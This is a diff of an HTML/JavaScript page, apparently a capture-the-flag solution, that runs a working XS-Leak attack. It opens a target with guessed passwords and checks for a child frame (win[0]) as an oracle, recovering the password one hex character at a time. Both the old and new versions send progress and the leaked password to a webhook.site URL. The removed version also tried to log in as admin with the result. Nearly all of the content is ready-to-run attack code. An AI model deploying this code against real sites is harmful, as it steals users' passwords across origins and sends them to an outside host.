@@ -1,133 +1,99 @@
 <!DOCTYPE html>
 <html>
-<head><title>win[0] Frame Access Exploit</title></head>
+<head><title>Final XS-Leak Exploit</title></head>
 <body>
-<h1>Password leak via win[0] frame access...</h1>
+<h1>XS-Leak Password Extraction</h1>
+<button id="startBtn" onclick="start()" style="padding:10px 20px; font-size:16px;">Start Exploit</button>
 <pre id="output"></pre>
 <script>
-const output = document.getElementById('output');
 const TARGET = 'https://127.0.0.1:9999/';
 const WEBHOOK = 'https://webhook.site/e1428f43-a4d5-4b12-8998-8fad37233bbf/';
 const CHARSET = '0123456789abcdef';
-let knownPassword = 'lebah';
+let known = 'lebah';
+let testing = false;
 
 function log(msg) {
-    output.textContent += msg + '\n';
-    console.log(msg);
+    document.getElementById('output').textContent += msg + '\n';
 }
 
-// Frame access oracle - returns true if iframe exists
-async function hasFrame(pass) {
+// Check if iframe exists by attempting to access win[0]
+async function check(candidate) {
+    if (testing) return false; // Prevent overlapping tests
+    testing = true;
+    
     return new Promise((resolve) => {
-        const win = window.open(TARGET + '?pass=' + encodeURIComponent(pass), '_blank');
+        const win = window.open(TARGET + '?pass=' + encodeURIComponent(candidate));
         
         setTimeout(() => {
-            let result = false;
-            
+            let hasFrame = false;
             try {
-                // If iframe exists, win[0] will be defined
-                result = (win[0] !== undefined);
+                // If win or win[0] access triggers cross-origin error, frame exists
+                const frame = win ? win[0] : null;
+                hasFrame = (frame !== undefined && frame !== null);
             } catch (e) {
-                // Cross-origin error also indicates frame exists
-                result = true;
+                // Cross-origin error = frame exists
+                hasFrame = e.message.includes('cross-origin') || e.message.includes('Blocked');
             }
             
-            win.close();
-            resolve(result);
-        }, 600); // 600ms for faster execution
+            if (win && !win.closed) {
+                try { win.close(); } catch(e) {}
+            }
+            testing = false;
+            resolve(hasFrame);
+        }, 1000); // 1 second per test
     });
 }
 
-async function leakPassword() {
-    log('[*] WIN[0] FRAME ACCESS ORACLE');
-    log('[*] Known prefix: ' + knownPassword);
-    log('');
+async function start() {
+    document.getElementById('startBtn').disabled = true;
+    log('Starting exploit...\n');
     
-    fetch(WEBHOOK + '?status=win0_exploit_started').catch(e=>{});
-    
-    // Verify oracle works
+    // Verify oracle
     log('[*] Verifying oracle...');
-    const testGood = await hasFrame('lebah');
-    log(`  "lebah" (should be TRUE): ${testGood}`);
+    const good = await check('lebah');
+    const bad = await check('lebahZ');
+    log(`  "lebah": ${good} (should be true)`);
+    log(`  "lebahZ": ${bad} (should be false)\n`);
     
-    const testBad = await hasFrame('lebahZ');
-    log(`  "lebahZ" (should be FALSE): ${testBad}`);
-    
-    if (!testGood || testBad) {
-        log('\n❌ Oracle verification failed!');
-        fetch(WEBHOOK + '?error=oracle_verification_failed').catch(e=>{});
+    if (!good || bad) {
+        log('❌ Oracle failed! Make sure bot is logged in.');
         return;
     }
     
-    log('\n✅ Oracle verified! Starting leak...\n');
+    log('✅ Oracle working!\n');
     
-    // Leak password character by character with PARALLEL testing
-    for (let pos = 0; pos < 12; pos++) { // Full 12 chars (lebah + 6 hex)
-        log(`[*] Position ${pos + 1}/12...`);
+    // Leak password
+    for (let pos = 0; pos < 6; pos++) { // 6 hex chars after "lebah"
+        log(`[*] Position ${pos+1}/6...`);
         let found = false;
         
-        // Test all 16 characters in parallel!
-        const promises = CHARSET.split('').map(c => {
-            const candidate = knownPassword + c;
-            return hasFrame(candidate).then(match => ({ char: c, match }));
-        });
-        
-        const results = await Promise.all(promises);
-        
-        // Check results
-        for (let r of results) {
-            log(`  "${r.char}": ${r.match ? '✓ MATCH!' : '✗'}`);
+        for (let c of CHARSET) {
+            const candidate = known + c;
+            const match = await check(candidate);
+            log(`  "${c}": ${match ? '✓' : '✗'}`);
             
-            if (r.match) {
-                knownPassword += r.char;
-                log(`  [+] Found '${r.char}' -> ${knownPassword}\n`);
-                
-                // Send progress
-                fetch(WEBHOOK + '?progress=' + encodeURIComponent(knownPassword)).catch(e=>{});
-                
+            if (match) {
+                known = candidate;
+                log(`\n✅ Found: ${known}\n`);
+                fetch(WEBHOOK + '?progress=' + known).catch(e=>{});
                 found = true;
                 break;
             }
         }
         
         if (!found) {
-            log(`  [-] No match at position ${pos + 1}!`);
+            log('\n❌ No match found!');
             break;
         }
     }
     
     log('\n========================================');
-    log('LEAKED PASSWORD: ' + knownPassword);
+    log('PASSWORD: ' + known);
     log('========================================');
-    
-    // Final exfiltration
-    fetch(WEBHOOK + '?PASSWORD=' + encodeURIComponent(knownPassword)).catch(e=>{});
-    
-    // Test login
-    log('\n[*] Testing login...');
-    setTimeout(async () => {
-        try {
-            const response = await fetch(TARGET + 'login', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: `username=admin&password=${encodeURIComponent(knownPassword)}`,
-                credentials: 'include',
-                redirect: 'manual'
-            });
-            
-            const success = response.type === 'opaqueredirect' || response.status === 0;
-            log(`Login test: ${success ? '✅ SUCCESS!' : '❌ Failed'}`);
-            
-            if (success) {
-                fetch(WEBHOOK + '?LOGIN_SUCCESS=' + encodeURIComponent(knownPassword)).catch(e=>{});
-            }
-        } catch (e) {
-            log('Login test error: ' + e.message);
-        }
-    }, 1000);
+    fetch(WEBHOOK + '?PASSWORD=' + known).catch(e=>{});
 }
 
-setTimeout(leakPassword, 500);
+log('Click "Start Exploit" button when ready!\n');
 </script>
 </body>
 </html>
